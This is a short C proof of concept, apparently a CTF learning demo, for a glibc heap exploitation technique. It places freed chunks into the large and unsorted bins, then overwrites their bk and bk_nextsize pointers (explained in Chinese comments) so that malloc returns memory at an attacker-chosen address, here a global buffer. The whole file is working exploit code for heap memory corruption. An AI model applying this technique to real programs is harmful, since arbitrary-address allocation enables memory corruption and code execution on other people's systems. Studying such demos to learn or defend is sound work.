#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char buf[0x100] = {0};

int main() {
   char *p1 = malloc(0x400 - 0x10);
   char *gap = malloc(0x10); //gap
   char *p2 = malloc(0x410 - 0x10);
   gap = malloc(0x10); //gap
   free(p1);
   malloc(0x500); //将p1放入large bin
   free(p2); //p2放入unsorted bin
   size_t addr = (size_t)(buf - 0x10);
   *(size_t *)(p1+0x8) = addr + 0x8; //修改large bin的bk
   *(size_t *)(p1 + 0x18) = addr - 0x18 - 0x5; //修改large bin的bk_nextsize
   *(size_t *)(p2 + 0x8) = addr;//修改unsorted bin的bk
   char *p = malloc(0x48); //申请到addr处
   strcpy(p,"hello,welcome to pwn world\n");
   write(1,buf,strlen(buf));
}
